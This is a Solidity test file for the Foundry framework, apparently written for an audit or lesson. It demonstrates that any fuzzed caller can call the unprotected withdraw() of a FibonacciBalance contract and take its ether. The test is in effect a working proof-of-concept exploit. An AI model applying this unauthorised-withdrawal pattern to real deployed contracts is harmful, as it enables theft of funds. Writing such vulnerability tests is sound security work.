
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance, FibonacciLib} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {
    FibonacciBalance public fibonacciBalance;
    FibonacciLib public fibonacciLib;

    function setUp() public {
        // Deploy the library contract first
        fibonacciLib = new FibonacciLib();
        
        // Deploy the FibonacciBalance contract with 10 ether
        fibonacciBalance = new FibonacciBalance{value: 10 ether}(address(fibonacciLib));
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the FibonacciBalance contract itself
        vm.assume(caller != address(fibonacciBalance));
        // Exclude the FibonacciLib contract
        vm.assume(caller != address(fibonacciLib));
        
        // Note: There is NO owner or privileged role in FibonacciBalance
        // The withdraw function has no access control - this is the vulnerability

        // --- 2. State Configuration ---
        // The contract was funded with 10 ether in setUp
        // Record initial state
        uint256 initialContractBalance = address(fibonacciBalance).balance;
        uint256 initialCallerBalance = caller.balance;
        uint256 initialWithdrawalCounter = fibonacciBalance.withdrawalCounter();
        
        // Ensure contract has enough balance for withdrawal
        require(initialContractBalance >= 1 ether, "Contract needs funds");

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected withdraw function
        // This should succeed for ANY caller - demonstrating the vulnerability
        fibonacciBalance.withdraw();

        // Assert that the withdrawal actually happened
        // The withdrawal counter should have incremented
        assertEq(
            fibonacciBalance.withdrawalCounter(), 
            initialWithdrawalCounter + 1, 
            "Withdrawal counter should increment"
        );
        
        // The caller should have received ether (first withdrawal = fibonacci(1) = start + 1 = 3 + 1 = 4 ether)
        // Since start = 3, fibonacci(1) = 4
        assertGt(
            caller.balance, 
            initialCallerBalance, 
            "Caller should have received ether"
        );
        
        // Contract balance should have decreased
        assertLt(
            address(fibonacciBalance).balance, 
            initialContractBalance, 
            "Contract balance should decrease"
        );
    }
}
